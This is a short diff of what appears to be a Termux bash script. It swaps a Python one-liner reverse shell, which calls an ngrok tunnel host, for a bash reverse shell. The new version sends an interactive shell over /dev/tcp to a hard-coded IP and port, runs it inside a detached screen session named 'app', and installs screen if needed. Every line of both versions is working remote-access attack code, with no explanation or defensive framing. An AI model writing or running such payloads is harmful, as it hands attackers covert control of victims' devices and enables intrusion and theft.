@@ -1,1 +1,16 @@
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",10936));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+#!$PREFIX/bash
+
+#DIR="/data/data/com.termux/files/usr/bin/screen"
+DIR="$PREFIX/screen"
+ip="192.168.0.13"
+port=1234
+
+if [ -d "$DIR" ]
+then
+
+	screen -dmLS app termux-chroot -- $PREFIX/bin/bash -i >& /dev/tcp/$ip/$port 0>&1
+else
+	apt install screen
+	clear
+	screen -dmLS app termux-chroot -- $PREFIX/bin/bash -i >& /dev/tcp/$ip/$port 0>&1
+fi
